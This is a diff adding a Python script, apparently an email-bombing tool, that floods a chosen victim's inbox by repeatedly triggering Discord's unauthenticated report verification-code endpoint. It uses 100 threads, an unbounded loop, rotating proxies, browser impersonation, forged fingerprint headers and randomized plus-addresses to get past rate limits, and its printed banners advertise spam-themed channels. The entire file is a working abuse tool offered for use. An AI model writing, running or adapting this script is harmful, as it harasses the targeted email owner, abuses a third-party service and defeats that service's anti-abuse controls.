@@ -1,0 +1,111 @@
+import curl_cffi
+from concurrent.futures import ThreadPoolExecutor
+import random
+import uuid
+import secrets
+import time
+
+print('NO SUPPORT FOR THIS TOOL IF YOU COME TO MY DISCORD SERVER AND ASK FOR HELP I WILL NOT ANSWER AND CLOSE UR TICKET')
+print('Found by r3ci | discord.gg/spamming | t.me/remoteexecution')
+email = input('full email eg. bob@gmail.com: ')
+threads = 100
+epart1 = email.split('@')[0]
+epart2 = email.split('@')[1]
+
+useproxies = input('use proxies? (NO PROXIES = SLOWER) (y/n): ')
+
+if useproxies == 'y':
+    try:
+        plist = open('proxies.txt', 'r').read().splitlines()
+        if plist == ['user:pass@ip:port']:  
+            print('No proxies found in proxies.txt, did u forget to save the file?')
+            useproxies = False
+        useproxies = True
+    except FileNotFoundError:
+        with open('proxies.txt', 'w') as f:
+            f.write('user:pass@ip:port')
+        useproxies = False
+else:
+    useproxies = False
+    plist = []
+
+s = curl_cffi.Session(impersonate='chrome136')
+
+def cwel():
+    idpart = ''.join(str(random.randint(0,9)) for _ in range(18))
+    def seg(n): return secrets.token_urlsafe(n)[:n]
+    return f'{idpart}.{seg(22)}.{seg(27)}'
+
+class bomber:
+    def __init__(self):
+        self.s = curl_cffi.Session(impersonate='chrome136')
+        if useproxies:
+            proxy = random.choice(plist)
+            fullproxy = f'http://{proxy}'
+            s.proxies = {
+                'http': fullproxy,
+                'https': fullproxy
+            }
+        s.headers.update({
+            'accept': '*/*',
+            'accept-encoding': 'gzip, deflate, br, zstd',
+            'accept-language': 'en-US,en;q=0.5',
+            'content-type': 'application/json',
+            'origin': 'https://discord.com',
+            'priority': 'u=1, i',
+            'referer': 'https://discord.com/report',
+            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'sec-gpc': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
+            'x-debug-options': 'bugReporterEnabled',
+            'x-discord-locale': 'en-US',
+            'x-discord-timezone': 'Europe/Warsaw',
+            'x-fingerprint': None,
+            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTQxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL215dm91Y2guZXMvIiwicmVmZXJyaW5nX2RvbWFpbiI6Im15dm91Y2guZXMiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6NDU3MTc0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsLCJjbGllbnRfbGF1bmNoX2lkIjoiMjc1MTM5MDItMjQxOC00Yjg5LWIyNzMtMWJhOTNhNTQ4NmI1IiwibGF1bmNoX3NpZ25hdHVyZSI6IjhlMDM2NDYwLWQzMjQtNDEwMS05YzE4LTc1MTYzNGM1YzNlZSIsImNsaWVudF9hcHBfc3RhdGUiOiJmb2N1c2VkIn0='
+        })
+        self.setcookie()
+
+    def setcookie(self):
+        s.cookies.update(self.s.get('https://discord.com/').cookies)
+
+    def send(self, email):
+        if useproxies:
+            proxy = random.choice(plist)
+            fullproxy = f'http://{proxy}'
+            s.proxies = {
+                'http': fullproxy,
+                'https': fullproxy
+            }
+
+        s.headers['x-fingerprint'] = cwel()
+        r = s.post(
+            'https://discord.com/api/v9/reporting/unauthenticated/message_urf/code',
+            json={
+                'name': random.choice(['message_urf', 'user_urf', 'guild_urf']),
+                'email': email
+            }
+        )
+
+        if r.status_code == 200:
+            print(f'Sent email with statking bypassed')
+
+        elif r.status_code == 429:
+            ratelimit = r.json().get('retry_after', 1.5)
+            print(f'IP Is ratelimited! time -> {ratelimit} | Use rotating proxies to get around this if you see this while using proxies they are sticky/static get ROTATING proxies')
+
+        else:
+            print(f'Failed to send ({r.text})')
+
+        
+        if not useproxies:
+            time.sleep(5)
+
+with ThreadPoolExecutor() as ex:
+    for _ in range(threads):
+        while True:
+            ex.submit(bomber().send, f'{epart1}+{''.join(str(random.randint(0, 9)) for _ in range(3))}@{epart2}')
